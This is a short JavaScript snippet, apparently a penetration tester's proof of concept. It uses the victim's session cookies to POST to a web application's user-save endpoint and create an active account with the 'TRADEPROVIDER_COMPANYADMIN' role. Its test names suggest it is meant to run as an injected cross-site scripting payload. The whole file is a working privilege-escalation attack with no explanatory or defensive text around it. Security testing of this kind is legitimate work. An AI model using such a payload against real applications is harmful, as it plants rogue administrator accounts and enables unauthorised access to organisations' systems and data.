async function saveUser() {
  const formData = new FormData();

  formData.append("FirstName", "thoroxss3");
  formData.append("LastName", "thoroxss3");
  formData.append("textbox-e", "dux-yama3@thoropentests.com");
  formData.append("UserID", "");
  formData.append("User_Phone", "(234) 343-5440");
  formData.append("textbox-p", "");
  formData.append("RoleName", "18");
  formData.append("AccountGUID", "B8FD4CC9-E2F4-4AE7-9B6A-3E72360A0E14");
  formData.append("workordertypes", "");
  formData.append("AdditionalRoles", "TRADEPROVIDER_COMPANYADMIN");
  formData.append("IsActive", "true");

  const res = await fetch("/api/user/saveuser", {
    method: "POST",
    credentials: "include", // sends cookies automatically
    body: formData
  });

  const text = await res.text();
  console.log("Response:", res.status, text);
}

saveUser();
